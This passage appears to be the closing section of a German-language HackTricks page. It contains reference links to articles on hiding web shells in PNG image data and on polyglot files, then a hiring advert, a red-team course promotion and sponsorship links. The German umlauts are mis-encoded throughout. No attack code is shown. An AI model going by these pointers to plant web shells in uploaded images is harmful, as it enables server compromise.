* [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Wenn Sie an einer **Hackerkarriere** interessiert sind und das Unhackbare hacken m√∂chten - **wir stellen ein!** (_flie√üendes Polnisch in Wort und Schrift erforderlich_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
